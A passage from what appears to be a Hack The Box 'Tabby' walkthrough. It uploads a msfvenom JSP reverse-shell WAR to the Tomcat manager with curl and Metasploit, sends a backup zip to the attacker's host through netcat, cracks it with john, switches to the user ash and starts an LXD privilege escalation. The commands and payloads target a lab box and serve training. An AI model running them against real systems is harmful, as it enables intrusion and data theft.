target="_blank">https://stackoverflow.com/questions/4432684/tomcat-manager-remote-deploy-script</a></p></blockquote><blockquote><p><a href="http://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html#Supported_Manager_Commands" target="_blank">http://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html#Supported_Manager_Commands</a></p></blockquote><p>This is a kind of <code class="language-plaintext highlighter-rouge">api</code> we can upload files using <code class="language-plaintext highlighter-rouge">curl</code> since we have credentials too</p><p>And found a <code class="language-plaintext highlighter-rouge">metasploit</code> module for <strong>deploy</strong> too</p><h1 id="attacking-the-tomcat">Attacking the tomcat</h1><p>I did it in two ways with metasploit and without metasploit both</p><h2 id="using-curl-api-way">Using curl (Api way)</h2><blockquote><p><a href="https://serverfault.com/questions/727992/how-to-deploy-a-tomcat-application-with-manager-url-api-when-using-custom-contex" target="_blank">https://serverfault.com/questions/727992/how-to-deploy-a-tomcat-application-with-manager-url-api-when-using-custom-contex</a></p></blockquote><p>The command will contain the username and password both…since i need to authorize myself too.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl <span class="nt">--user</span> <span class="s1">'user:password'</span> <span class="nt">--upload-file</span> file <span class="s2">"http://tabby.htb:8080/manager/text/deploy?path=/file"</span>
</pre></table></code></div></div><p>First i need to create a <code class="language-plaintext highlighter-rouge">malicious</code> <strong>.war</strong> file that will be uploaded</p><blockquote><p>createing .war file</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>➜  prashant msfvenom <span class="nt">-p</span> java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.79 <span class="nv">LPORT</span><span class="o">=</span>1234 <span class="nt">-f</span> war <span class="o">&gt;</span> prashant.war

Payload size: 1099 bytes
Final size of war file: 1099 bytes
</pre></table></code></div></div><p>And its time to upload it now….</p><blockquote><p>deploying/uploading file</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>➜  prashant curl <span class="nt">--user</span> <span class="s1">'tomcat:$3cureP4s5w0rd123!'</span> <span class="nt">--upload-file</span> prashant.war <span class="s2">"http://tabby.htb:8080/manager/text/deploy?path=/prashant.war"</span>
OK - Deployed application at context path <span class="o">[</span>/prashant.war]
</pre></table></code></div></div><p>Now it time to execute it / accessing it so i can get a rev shell</p><p><a href="/hackthebox/tabby/0793dcdc-194d-4fe6-bb48-d5a438bbeb07/image-8.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/tabby/0793dcdc-194d-4fe6-bb48-d5a438bbeb07/image-8.png" alt="executing file " /></a></p><p>the url will be</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://tabby.htb:8080/prashant.war/
</pre></table></code></div></div><blockquote><p>Got reverse shell</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>➜  tabby rlwrap nc <span class="nt">-nlvp</span> 1234
Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.10.194.
Ncat: Connection from 10.10.10.194:41348.
<span class="nb">whoami
</span>tomcat
<span class="nb">hostname
</span>tabby
</pre></table></code></div></div><h2 id="using-metasploit">Using metasploit</h2><p>There is a <code class="language-plaintext highlighter-rouge">module</code> called <strong>exploit/multi/http/tomcat_mgr_deploy</strong> which is based on this <code class="language-plaintext highlighter-rouge">deploy</code> thing and we can exploit it with the module</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>msf5 exploit<span class="o">(</span>multi/http/tomcat_mgr_deploy<span class="o">)</span> <span class="o">&gt;</span> options

Module options <span class="o">(</span>exploit/multi/http/tomcat_mgr_deploy<span class="o">)</span>:

   Name          Current Setting  Required  Description
   <span class="nt">----</span>          <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   HttpPassword                   no        The password <span class="k">for </span>the specified username
   HttpUsername                   no        The username to authenticate as
   PATH          /manager         <span class="nb">yes       </span>The URI path of the manager app <span class="o">(</span>/deploy and /undeploy will be used<span class="o">)</span>
   Proxies                        no        A proxy chain of format <span class="nb">type</span>:host:port[,type:host:port][...]
   RHOSTS                         <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, range CIDR identifier, or hosts file with syntax <span class="s1">'file:&lt;path&gt;'</span>
   RPORT         80               <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>
   SSL           <span class="nb">false            </span>no        Negotiate SSL/TLS <span class="k">for </span>outgoing connections
   VHOST                          no        HTTP server virtual host


Exploit target:

   Id  Name
   <span class="nt">--</span>  <span class="nt">----</span>
   0   Automatic
</pre></table></code></div></div><blockquote><p>setting up the exploit</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>msf5 exploit<span class="o">(</span>multi/http/tomcat_mgr_deploy<span class="o">)</span> <span class="o">&gt;</span>                                                                                       
msf5 exploit<span class="o">(</span>multi/http/tomcat_mgr_deploy<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>HttpUsername tomcat                                                                                  
HttpUsername <span class="o">=&gt;</span> tomcat                                                                                                                        
msf5 exploit<span class="o">(</span>multi/http/tomcat_mgr_deploy<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>HttpPassword <span class="s1">'$3cureP4s5w0rd123!'</span>                                                                          
HttpPassword <span class="o">=&gt;</span> <span class="nv">$3cureP4s5w0rd123</span><span class="o">!</span>                                                       
msf5 exploit<span class="o">(</span>multi/http/tomcat_mgr_deploy<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOSTS tabby.htb                                                                           
RHOSTS <span class="o">=&gt;</span> tabby.htb                                                                                
msf5 exploit<span class="o">(</span>multi/http/tomcat_mgr_deploy<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RPORT 8080                                                                       
RPORT <span class="o">=&gt;</span> 8080                                                                                                                               
msf5 exploit<span class="o">(</span>multi/http/tomcat_mgr_deploy<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>PATH /manager/text                                               
PATH <span class="o">=&gt;</span> /manager/text        
</pre></table></code></div></div><blockquote><p>Running the exploit</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>msf5 exploit<span class="o">(</span>multi/http/tomcat_mgr_deploy<span class="o">)</span> <span class="o">&gt;</span> run                                                                                                  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.79:4444                                                                                                          
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Attempting to automatically <span class="k">select </span>a target...                                                                                                 
<span class="o">[</span>-] Exploit aborted due to failure: no-target: Unable to automatically <span class="k">select </span>a target                                                         
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Exploit completed, but no session was created.
</pre></table></code></div></div><p>Well i didnt expexted it it says something about <code class="language-plaintext highlighter-rouge">target</code> , so i need to setup the target</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>msf5 exploit<span class="o">(</span>multi/http/tomcat_mgr_deploy<span class="o">)</span> <span class="o">&gt;</span> show targets

Exploit targets:

   Id  Name
   <span class="nt">--</span>  <span class="nt">----</span>
   0   Automatic
   1   Java Universal
   2   Windows Universal
   3   Linux x86
</pre></table></code></div></div><blockquote><p>setting targets</p></blockquote><p>since the machine is linux based i will choose the <code class="language-plaintext highlighter-rouge">3th</code> options , the linux one</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>msf5 exploit<span class="o">(</span>multi/http/tomcat_mgr_deploy<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>target 3
target <span class="o">=&gt;</span> 3
</pre></table></code></div></div><blockquote><p>setting payload</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre><td class="rouge-code"><pre>msf5 exploit<span class="o">(</span>multi/http/tomcat_mgr_deploy<span class="o">)</span> <span class="o">&gt;</span> show payloads

Compatible Payloads
<span class="o">===================</span>

   <span class="c">#   Name                                      Disclosure Date  Rank    Check  Description</span>
   -   <span class="nt">----</span>                                      <span class="nt">---------------</span>  <span class="nt">----</span>    <span class="nt">-----</span>  <span class="nt">-----------</span>
   0   generic/custom                                             manual  No     Custom Payload
   1   generic/debug_trap                                         manual  No     Generic x86 Debug Trap
   2   generic/shell_bind_tcp                                     manual  No     Generic Command Shell, Bind TCP Inline
   3   generic/shell_reverse_tcp                                  manual  No     Generic Command Shell, Reverse TCP Inline
   4   generic/tight_loop                                         manual  No     Generic x86 Tight Loop
   5   linux/x86/chmod                                            manual  No     Linux Chmod
   6   linux/x86/exec                                             manual  No     Linux Execute Command
   7   linux/x86/meterpreter/bind_ipv6_tcp                        manual  No     Linux Mettle x86, Bind IPv6 TCP Stager <span class="o">(</span>Linux x86<span class="o">)</span>
   8   linux/x86/meterpreter/bind_ipv6_tcp_uuid                   manual  No     Linux Mettle x86, Bind IPv6 TCP Stager with UUID Support <span class="o">(</span>Linux x86<span class="o">)</span>
   9   linux/x86/meterpreter/bind_nonx_tcp                        manual  No     Linux Mettle x86, Bind TCP Stager
   10  linux/x86/meterpreter/bind_tcp                             manual  No     Linux Mettle x86, Bind TCP Stager <span class="o">(</span>Linux x86<span class="o">)</span>
   11  linux/x86/meterpreter/bind_tcp_uuid                        manual  No     Linux Mettle x86, Bind TCP Stager with UUID Support <span class="o">(</span>Linux x86<span class="o">)</span>
   12  linux/x86/meterpreter/reverse_ipv6_tcp                     manual  No     Linux Mettle x86, Reverse TCP Stager <span class="o">(</span>IPv6<span class="o">)</span>
   13  linux/x86/meterpreter/reverse_nonx_tcp                     manual  No     Linux Mettle x86, Reverse TCP Stager
   14  linux/x86/meterpreter/reverse_tcp                          manual  No     Linux Mettle x86, Reverse TCP Stager
   15  linux/x86/meterpreter/reverse_tcp_uuid                     manual  No     Linux Mettle x86, Reverse TCP Stager
   16  linux/x86/meterpreter_reverse_http                         manual  No     Linux Meterpreter, Reverse HTTP Inline
   17  linux/x86/meterpreter_reverse_https                        manual  No     Linux Meterpreter, Reverse HTTPS Inline
   18  linux/x86/meterpreter_reverse_tcp                          manual  No     Linux Meterpreter, Reverse TCP Inline
   19  linux/x86/metsvc_bind_tcp                                  manual  No     Linux Meterpreter Service, Bind TCP
   20  linux/x86/metsvc_reverse_tcp                               manual  No     Linux Meterpreter Service, Reverse TCP Inline
   21  linux/x86/read_file                                        manual  No     Linux Read File
   22  linux/x86/shell/bind_ipv6_tcp                              manual  No     Linux Command Shell, Bind IPv6 TCP Stager <span class="o">(</span>Linux x86<span class="o">)</span>
   23  linux/x86/shell/bind_ipv6_tcp_uuid                         manual  No     Linux Command Shell, Bind IPv6 TCP Stager with UUID Support <span class="o">(</span>Linux x86<span class="o">)</span>
   24  linux/x86/shell/bind_nonx_tcp                              manual  No     Linux Command Shell, Bind TCP Stager
   25  linux/x86/shell/bind_tcp                                   manual  No     Linux Command Shell, Bind TCP Stager <span class="o">(</span>Linux x86<span class="o">)</span>
   26  linux/x86/shell/bind_tcp_uuid                              manual  No     Linux Command Shell, Bind TCP Stager with UUID Support <span class="o">(</span>Linux x86<span class="o">)</span>
   27  linux/x86/shell/reverse_ipv6_tcp                           manual  No     Linux Command Shell, Reverse TCP Stager <span class="o">(</span>IPv6<span class="o">)</span>
   28  linux/x86/shell/reverse_nonx_tcp                           manual  No     Linux Command Shell, Reverse TCP Stager
   29  linux/x86/shell/reverse_tcp                                manual  No     Linux Command Shell, Reverse TCP Stager
   30  linux/x86/shell/reverse_tcp_uuid                           manual  No     Linux Command Shell, Reverse TCP Stager
   31  linux/x86/shell_bind_ipv6_tcp                              manual  No     Linux Command Shell, Bind TCP Inline <span class="o">(</span>IPv6<span class="o">)</span>
   32  linux/x86/shell_bind_tcp                                   manual  No     Linux Command Shell, Bind TCP Inline
   33  linux/x86/shell_bind_tcp_random_port                       manual  No     Linux Command Shell, Bind TCP Random Port Inline
   34  linux/x86/shell_reverse_tcp                                manual  No     Linux Command Shell, Reverse TCP Inline
   35  linux/x86/shell_reverse_tcp_ipv6                           manual  No     Linux Command Shell, Reverse TCP Inline <span class="o">(</span>IPv6<span class="o">)</span>
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>msf5 exploit<span class="o">(</span>multi/http/tomcat_mgr_deploy<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload 14
payload <span class="o">=&gt;</span> linux/x86/meterpreter/reverse_tcp
</pre></table></code></div></div><blockquote><p>running the exploit again</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>msf5 exploit<span class="o">(</span>multi/http/tomcat_mgr_deploy<span class="o">)</span> <span class="o">&gt;</span> run

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.79:4444 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using manually <span class="k">select </span>target <span class="s2">"Linux x86"</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading 1603 bytes as j958wtt1p7aHFr.war ...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Executing /j958wtt1p7aHFr/WHRWFFcnMyH.jsp...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Undeploying j958wtt1p7aHFr ...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>980808 bytes<span class="o">)</span> to 10.10.10.194
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 2 opened <span class="o">(</span>10.10.14.79:4444 -&gt; 10.10.10.194:52914<span class="o">)</span> at 2020-06-23 03:52:30 <span class="nt">-0400</span>

meterpreter <span class="o">&gt;</span> shell
Process 2397 created.
Channel 1 created.
<span class="nb">whoami
</span>tomcat
<span class="nb">hostname
</span>tabby
</pre></table></code></div></div><blockquote><p>Spawing a tty shell</p></blockquote><p>Python3 is installed better if i just upgrade my shell to <code class="language-plaintext highlighter-rouge">tty</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>which python3
/usr/bin/python3
python3 <span class="nt">-c</span> <span class="s2">"import pty;pty.spawn('/bin/bash')"</span>
tomcat@tabby:/var/lib/tomcat9<span class="nv">$ </span>
</pre></table></code></div></div><h1 id="enumerating-as-user-tomcat">Enumerating as user tomcat</h1><p>Some manual enumeration and i found a <code class="language-plaintext highlighter-rouge">zip</code> file</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>tomcat@tabby:/var/www/html/files<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="nb">ls</span> <span class="nt">-la</span>
total 36
drwxr-xr-x 4 ash  ash  4096 Jun 17 21:59 <span class="nb">.</span>
drwxr-xr-x 4 root root 4096 Jun 17 16:24 ..
<span class="nt">-rw-r--r--</span> 1 ash  ash  8716 Jun 16 13:42 16162020_backup.zip
</pre></table></code></div></div><blockquote><p>Downloading the file</p></blockquote><p><code class="language-plaintext highlighter-rouge">Netcat</code> is installed on the machine so no need to download it on machine , i can transfer the files using <code class="language-plaintext highlighter-rouge">netcat</code></p><blockquote><p>on tabby</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>tomcat@tabby:/var/www/html/files<span class="nv">$ </span><span class="nb">cat </span>16162020_backup.zip | nc 10.10.14.79 4444
</pre></table></code></div></div><blockquote><p>on my machine</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>➜  tabby nc <span class="nt">-nlvp</span> 4444 <span class="o">&gt;&gt;</span> file.zip
Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.194.
Ncat: Connection from 10.10.10.194:52962.
</pre></table></code></div></div><blockquote><p>file.zip</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>➜  tabby <span class="nb">ls</span> <span class="nt">-la</span> file.zip
<span class="nt">-rw-r--r--</span> 1 root root 8716 Jun 23 03:54 file.zip
</pre></table></code></div></div><h2 id="unzipping-the-file">unzipping the file</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>➜  tabby unzip file.zip
Archive:  file.zip
<span class="o">[</span>file.zip] var/www/html/favicon.ico password:
</pre></table></code></div></div><p>The file.zip is password <code class="language-plaintext highlighter-rouge">protected</code> so i need to crack the zip file <code class="language-plaintext highlighter-rouge">password</code> , i will using <code class="language-plaintext highlighter-rouge">john</code></p><h2 id="crcaking-zip-file-password-with-john">Crcaking zip file password with john</h2><blockquote><p>zip2john to generate hash for the zip-file</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>➜  tabby zip2john file.zip <span class="o">&gt;&gt;</span> zip-hash
file.zip/var/www/html/assets/ is not encrypted!
ver 1.0 file.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression <span class="nb">type
</span>ver 2.0 efh 5455 efh 7875 file.zip/var/www/html/favicon.ico PKZIP Encr: 2b chk, TS_chk, <span class="nv">cmplen</span><span class="o">=</span>338, <span class="nv">decmplen</span><span class="o">=</span>766, <span class="nv">crc</span><span class="o">=</span>282B6DE2
ver 1.0 file.zip/var/www/html/files/ is not encrypted, or stored with non-handled compression <span class="nb">type
</span>ver 2.0 efh 5455 efh 7875 file.zip/var/www/html/index.php PKZIP Encr: 2b chk, TS_chk, <span class="nv">cmplen</span><span class="o">=</span>3255, <span class="nv">decmplen</span><span class="o">=</span>14793, <span class="nv">crc</span><span class="o">=</span>285CC4D6
ver 1.0 efh 5455 efh 7875 file.zip/var/www/html/logo.png PKZIP Encr: 2b chk, TS_chk, <span class="nv">cmplen</span><span class="o">=</span>2906, <span class="nv">decmplen</span><span class="o">=</span>2894, <span class="nv">crc</span><span class="o">=</span>2F9F45F
ver 2.0 efh 5455 efh 7875 file.zip/var/www/html/news.php PKZIP Encr: 2b chk, TS_chk, <span class="nv">cmplen</span><span class="o">=</span>114, <span class="nv">decmplen</span><span class="o">=</span>123, <span class="nv">crc</span><span class="o">=</span>5C67F19E
ver 2.0 efh 5455 efh 7875 file.zip/var/www/html/Readme.txt PKZIP Encr: 2b chk, TS_chk, <span class="nv">cmplen</span><span class="o">=</span>805, <span class="nv">decmplen</span><span class="o">=</span>1574, <span class="nv">crc</span><span class="o">=</span>32DB9CE3
NOTE: It is assumed that all files <span class="k">in </span>each archive have the same password.
If that is not the <span class="k">case</span>, the <span class="nb">hash </span>may be uncrackable. To avoid this, use
option <span class="nt">-o</span> to pick a file at a time.
</pre></table></code></div></div><p>Save the hash in a <code class="language-plaintext highlighter-rouge">zip-hash</code> filename</p><blockquote><p>cracking the password</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>➜  tabby john zip-hash <span class="nt">-w</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64]<span class="o">)</span>
Will run 5 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
admin@it         <span class="o">(</span>file.zip<span class="o">)</span>
1g 0:00:00:01 DONE <span class="o">(</span>2020-06-23 04:01<span class="o">)</span> 0.9900g/s 10260Kp/s 10260Kc/s 10260KC/s adorovospesoal..adenabuck
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed
</pre></table></code></div></div><p>And i got the password <code class="language-plaintext highlighter-rouge">admin@it</code></p><blockquote><p>unzipping</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>➜  tabby unzip file.zip 
Archive:  file.zip
   creating: var/www/html/assets/
<span class="o">[</span>file.zip] var/www/html/favicon.ico password: 
  inflating: var/www/html/favicon.ico  
   creating: var/www/html/files/
  inflating: var/www/html/index.php  
 extracting: var/www/html/logo.png   
  inflating: var/www/html/news.php   
  inflating: var/www/html/Readme.txt
</pre></table></code></div></div><p>There is nothing <code class="language-plaintext highlighter-rouge">suspicious</code> and its just a <code class="language-plaintext highlighter-rouge">backup-zip</code> of the website itself nothing else…but what next ?</p><h1 id="login-as-ash">Login as ash</h1><p>Well the <code class="language-plaintext highlighter-rouge">zip-password</code> is the password for the user <strong>ash</strong> i can switch to it finally…</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>tomcat@tabby:/var/www/html/files<span class="nv">$ </span>su - ash
su - ash
Password: admin@it

ash@tabby:~<span class="nv">$ </span><span class="nb">whoami
whoami
</span>ash
</pre></table></code></div></div><h2 id="got-usertxt">got user.txt</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>ash@tabby:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
<span class="nb">cat </span>user.txt
9f30215d278a3dcd011d077287ddd020
</pre></table></code></div></div><h1 id="privlege-escalation-to-root">Privlege escalation to root</h1><p>The user <code class="language-plaintext highlighter-rouge">ash</code> is in the groups in <code class="language-plaintext highlighter-rouge">lxd</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>ash@tabby:~<span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>ash<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>ash<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>ash<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,116<span class="o">(</span>lxd<span class="o">)</span>
</pre></table></code></div></div><p>There are many <code class="language-plaintext highlighter-rouge">articles</code> on this thing if we google about it…</p><blockquote><p><a href="https://www.hackingarticles.in/lxd-privilege-escalation/" target="_blank">https://www.hackingarticles.in/lxd-privilege-escalation/</a></p></blockquote><blockquote><p><a href="https://ethicalhackingguru.com/the-lxd-privilege-escalation-tutorial-how-to-exploit-lxd/" target="_blank">https://ethicalhackingguru.com/the-lxd-privilege-escalation-tutorial-how-to-exploit-lxd/</a></p></blockquote><blockquote><p><a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04" target="_blank">https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04</a></p></blockquote><p>and i need the repo</p><blockquote><p><a href="https://github.com/saghul/lxd-alpine-builder" target="_blank">https://github.com/saghul/lxd-alpine-builder</a></p></blockquote><h2 id="building-the-alpine-image">Building the alpine image</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
</pre><td class="rouge-code"><pre>➜  lxd-alpine-builder git:<span class="o">(</span>master<span class="o">)</span> ./build-alpine 
Determining the latest release... v3.12
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.12/main/x86_64
Downloading alpine-mirrors-3.5.10-r0.apk
<span class="nb">tar</span>: Ignoring unknown extended header keyword <span class="s1">'APK-TOOLS.checksum.SHA1'</span>
<span class="nb">tar</span>: Ignoring unknown extended header keyword <span class="s1">'APK-TOOLS.checksum.SHA1'</span>
Downloading alpine-keys-2.2-r0.apk
<span class="nb">tar</span>: Ignoring unknown extended header keyword <span class="s1">'APK-TOOLS.checksum.SHA1'</span>
<span class="nb">tar</span>: Ignoring unknown extended header keyword <span class="s1">'APK-TOOLS.checksum.SHA1'</span>
<span class="nb">tar</span>: Ignoring unknown extended header keyword <span class="s1">'APK-TOOLS.checksum.SHA1'</span>
<span class="nb">tar</span>: Ignoring unknown extended header keyword <span class="s1">'APK-TOOLS.checksum.SHA1'</span>
<span class="nb">tar</span>: Ignoring unknown extended header keyword <span class="s1">'APK-TOOLS.checksum.SHA1'</span>
<span class="nb">tar</span>: Ignoring unknown extended header keyword <span class="s1">'APK-TOOLS.checksum.SHA1'</span>
<span class="nb">tar</span>: Ignoring unknown extended header keyword <span class="s1">'APK-TOOLS.checksum.SHA1'</span>
<span class="nb">tar</span>: Ignoring unknown extended header keyword <span class="s1">'APK-TOOLS.checksum.SHA1'</span>
<span class="nb">tar</span>: Ignoring unknown extended header keyword <span class="s1">'APK-TOOLS.checksum.SHA1'</span>
<span class="nb">tar</span>: Ignoring unknown extended header keyword <span class="s1">'APK-TOOLS.checksum.SHA1'</span>
<span class="nb">tar</span>: Ignoring unknown extended header keyword <span class="s1">'APK-TOOLS.checksum.SHA1'</span>
<span class="nb">tar</span>: Ignoring unknown extended header keyword <span class="s1">'APK-TOOLS.checksum.SHA1'</span>
<span class="nb">tar</span>: Ignoring unknown extended header keyword <span class="s1">'APK-TOOLS.checksum.SHA1'</span>
<span class="nb">tar</span>: Ignoring unknown extended header keyword <span class="s1">'APK-TOOLS.checksum.SHA1'</span>
<span class="nb">tar</span>: Ignoring unknown extended header keyword <span class="s1">'APK-TOOLS.checksum.SHA1'</span>
<span class="nb">tar</span>: Ignoring unknown extended header keyword <span class="s1">'APK-TOOLS.checksum.SHA1'</span>
<span class="o">(</span>2/19<span class="o">)</span> Installing busybox <span class="o">(</span>1.31.1-r19<span class="o">)</span>
Executing busybox-1.31.1-r19.post-install
<span class="o">(</span>3/19<span class="o">)</span> Installing alpine-baselayout <span class="o">(</span>3.2.0-r7<span class="o">)</span><span class="s1">'APK-TOOLS.checksum.SHA1'</span>
Executing alpine-baselayout-3.2.0-r7.pre-install
Executing alpine-baselayout-3.2.0-r7.post-install
<span class="o">(</span>4/19<span class="o">)</span> Installing openrc <span class="o">(</span>0.42.1-r10<span class="o">)</span> keyword <span class="s1">'APK-TOOLS.checksum.SHA1'</span>
Executing openrc-0.42.1-r10.post-install
<span class="o">(</span>5/19<span class="o">)</span> Installing alpine-conf <span class="o">(</span>3.9.0-r1<span class="o">)</span>840.rsa.pub: OK
<span class="o">(</span>6/19<span class="o">)</span> Installing libcrypto1.1 <span class="o">(</span>1.1.1g-r0<span class="o">)</span>
<span class="o">(</span>7/19<span class="o">)</span> Installing libssl1.1 <span class="o">(</span>1.1.1g-r0<span class="o">)</span>
